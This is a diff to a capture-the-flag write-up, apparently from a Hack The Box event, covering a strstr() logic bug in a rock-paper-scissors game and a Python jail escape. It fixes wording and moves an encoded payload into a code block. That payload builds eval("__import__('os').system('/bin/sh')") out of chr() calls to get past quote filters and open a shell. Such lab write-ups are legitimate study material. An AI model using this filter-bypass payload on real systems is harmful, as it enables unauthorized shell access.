@@ -331,7 +331,7 @@ int game()
 
 We noticed that the program (Guru) chooses a random number from 0 to 2, which is rock, paper, scissors accordingly. It then checks if our input contains the string that can win against its choice using the [strstr()](https://man7.org/linux/man-pages/man3/strstr.3.html) function.
 
-In order words, if Guru chooses rock, then if our input contain the string "scissors", we win.
+In other words, if Guru chooses **rock**, then if our input contain the string **paper**, we win.
 
 We can exploit the **strstr()** by spamming **rockpaperscissors** 100 times or write a script to do it for us.
 
@@ -367,7 +367,11 @@ One way to bypass this is to break down the string of code we want to execute in
 
 We can bypass the **'** and **"** filter simply by using chr(hex-value-of-the-ascii-character) to make the character we want.
 
-For this I used **eval("\__import__('os').system('/bin/sh')")**. The payload for this is: **eval(chr(0x5f)+chr(0x5f)+chr(0x69)+chr(0x6d)+chr(0x70)+chr(0x6f)+chr(0x72)+chr(0x74)+chr(0x5f)+chr(0x5f)+chr(0x28)+chr(0x27)+chr(0x6f)+chr(0x73)+chr(0x27)+chr(0x29)+chr(0x2e)+chr(0x73)+chr(0x79)+chr(0x73)+chr(0x74)+chr(0x65)+chr(0x6d)+chr(0x28)+chr(0x27)+chr(0x2f)+chr(0x62)+chr(0x69)+chr(0x6e)+chr(0x2f)+chr(0x73)+chr(0x68)+chr(0x27)+chr(0x29))**
+For this I used `eval("\__import__('os').system('/bin/sh')")`. The payload for this is:
+
+```
+eval(chr(0x5f)+chr(0x5f)+chr(0x69)+chr(0x6d)+chr(0x70)+chr(0x6f)+chr(0x72)+chr(0x74)+chr(0x5f)+chr(0x5f)+chr(0x28)+chr(0x27)+chr(0x6f)+chr(0x73)+chr(0x27)+chr(0x29)+chr(0x2e)+chr(0x73)+chr(0x79)+chr(0x73)+chr(0x74)+chr(0x65)+chr(0x6d)+chr(0x28)+chr(0x27)+chr(0x2f)+chr(0x62)+chr(0x69)+chr(0x6e)+chr(0x2f)+chr(0x73)+chr(0x68)+chr(0x27)+chr(0x29))
+```
 
 Now with all the pieces together, let's send our exploit.
 
@@ -466,3 +470,8 @@ io.interactive()
 <img src="flag4.png" alt="Logic bug go brrr" width="1000"/>
 
 Flag is: **HTB{4cro55_th3_br1dg3_4nd_th3_ch4sm_l13s_th3_tr34sur3}**
+
+## Original Posts
+
+- [From FazeCT](https://fazect.github.io/htb2023/)
+
